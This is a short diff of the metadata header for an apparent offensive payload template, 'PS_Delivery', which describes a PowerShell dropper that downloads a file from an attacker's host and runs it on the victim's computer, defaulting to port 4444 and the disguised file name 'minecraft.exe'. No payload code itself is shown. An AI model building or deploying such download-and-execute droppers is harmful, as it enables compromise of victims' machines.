@@ -1,12 +1,12 @@
 #!name##PS_Delivery
 #!types##payload
 #!info##Code in Powershell. It establishes a connection to the server, downloads the file and runs it on the victim's computer. Perfect for working with a 'send' server.
-#!coderOpt##FORMAT##PS_SCRIPT
 #!reqVar##IP_ADDR##Host ip address##str
 #!reqVar##PSD_port##Host port number##int
 #!setVar##PSD_port##4444##int
 #!reqVar##PSD_fname##Name for the file stored on the victim's computer.##str
 #!setVar##PSD_fname##minecraft.exe##str
+#!payStep##format_ps
 #!render_FLAG##True
 #!lang##PowerShell
 
